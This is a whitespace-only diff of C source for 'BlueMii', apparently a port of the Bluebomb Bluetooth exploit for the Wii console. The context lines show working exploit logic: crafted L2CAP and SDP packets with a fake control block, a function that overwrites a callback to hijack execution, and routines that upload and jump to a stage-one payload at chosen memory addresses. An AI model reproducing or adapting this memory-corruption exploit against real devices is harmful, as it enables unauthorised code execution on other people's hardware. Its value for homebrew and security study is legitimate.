@@ -275,7 +275,7 @@ static err_t jump_payload(struct l2cap_pcb *pcb) {
 static err_t upload_payload(struct l2cap_pcb *pcb, struct payload_info_t* payload_info) {
 	err_t ret = 0;
 	struct pbuf *data;
-	
+
 	int packet_size = payload_info->remaining >= PAYLOAD_MTU ? PAYLOAD_MTU : payload_info->remaining % PAYLOAD_MTU;
 	if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
 		fprintf(stderr, "%supload_payload: Could not allocate memory for pbuf%s\n", color_red, color_grey);
@@ -310,7 +310,7 @@ static err_t bluebomb_success2(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_
 			bomb_err = jump_payload(pcb);
 		}
 	}
-	
+
 	return ERR_OK;
 }
 
@@ -322,7 +322,7 @@ static err_t bluebomb_success(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t
 		l2ca_bluebomb(pcb, bluebomb_success2);
 		return bluebomb_success2(arg, pcb, resp, id);
 	}
-	
+
 	return ERR_OK;
 }
 
@@ -335,9 +335,9 @@ static err_t bluebomb_disconnected_ind(void *arg, struct l2cap_pcb *pcb, err_t e
 static err_t do_hax(struct l2cap_pcb *pcb) {
 	err_t ret;
 	struct pbuf *data;
-	
+
 	printf("Overwriting callback in switch case 0x9.\n");
-	
+
 	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
 		fprintf(stderr, "%sdo_hax: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 		return ERR_MEM;
@@ -351,7 +351,7 @@ static err_t do_hax(struct l2cap_pcb *pcb) {
 		fprintf(stderr, "%sdo_hax: Failed to send hax packet (%d)%s\n", color_red, ret, color_grey);
 		return ret;
 	}
-	
+
 	printf("Trigger switch statement 0x9.\n");
 
 	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
@@ -385,7 +385,7 @@ static err_t send_sdp_service_response(struct l2cap_pcb *pcb,u16_t tid) {
 	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
 	fake_ccb.local_cid = htobe16(0x0000);
 	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
-	
+
 	UINT8_TO_BE_STREAM(p, SDP_SERVICE_SEARCH_RSP); // SDP_ServiceSearchResponse
 	UINT16_TO_BE_STREAM(p, tid); // Transaction ID
 	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
@@ -421,13 +421,13 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 
 	u8_t *p = NULL;
 	struct pbuf *data = NULL;
-	
+
 	if (size_remaining == 0) {
 		size_remaining = len;
 		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
 		u16_t packet_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + payload_size + 1;
 		printf("Sending SDP attribute response\n");
-	
+
 		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
 			fprintf(stderr, "%ssend_sdp_attribute_response: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 			return ERR_MEM;
@@ -453,7 +453,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		}
 
 		btpbuf_free(data);
-		
+
 		size_remaining -= payload_size;
 
 		if (size_remaining <= 0) {
@@ -475,7 +475,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
 		memcpy(p, payload + len - size_remaining, payload_size); p += (payload_size); // payload
 		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
-		
+
 		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
 			fprintf(stderr, "%ssend_sdp_attribute_response: Failed to send SDP attribute response packet (%d)%s\n", color_red, ret, color_grey);
 			btpbuf_free(data);
@@ -483,7 +483,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		}
 
 		btpbuf_free(data);
-		
+
 		size_remaining -= payload_size;
 
 		if (size_remaining <= 0) {
@@ -500,7 +500,7 @@ static err_t __bluebomb_receive(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,e
 	if (pcb->psm == SDP_PSM) {
 		u8_t hdr = *(u8_t *)p->payload;
 		u16_t tid = be16toh(*((u16_t*)((u8_t *)p->payload) + 1));
-	
+
 		switch (hdr) {
 			case SDP_SERVICE_SEARCH_REQ:
 				ret = send_sdp_service_response(pcb, tid);
@@ -645,7 +645,7 @@ int main(int argc, char **argv) {
 				console_set_cursor_pos(1, 0);
 				printf("%sBlueMii%s (Bluebomb v1.5)\n", color_blue, color_grey);
 				printf("Original exploit/code by %sFullmetal5%s, port by %sZarithya%s\n\n", color_turquoise, color_grey, color_magenta, color_grey);
-				
+
 				console_clear_line(2);
 				printf("Please select your exploit target: <%s>\n", stage0_addrs[which_addr].name);
 				if ((wpad_pressed & WPAD_BUTTON_RIGHT) || (pad_pressed & PAD_BUTTON_RIGHT)) {
@@ -679,7 +679,7 @@ int main(int argc, char **argv) {
 				console_set_cursor_pos(8, 0);
 				printf("Starting Bluebomb for target %s...\n\n", stage0_addrs[which_addr].name);
 				L2CB = stage0_addrs[which_addr].addr;
-				
+
 				if (L2CB >= 0x81000000) { // System menu
 					payload_addr = 0x80004000;
 				} else {
@@ -691,7 +691,7 @@ int main(int argc, char **argv) {
 				payload_info.payload = stage1_bin;
 				payload_info.length = sizeof(stage1_bin);
 				payload_info.remaining = sizeof(stage1_bin);
-		
+
 				BT_Init(bluebomb_accept, &sdp_pcb);
 				hci_sync_btn(WiiSyncButton);
 				state++;
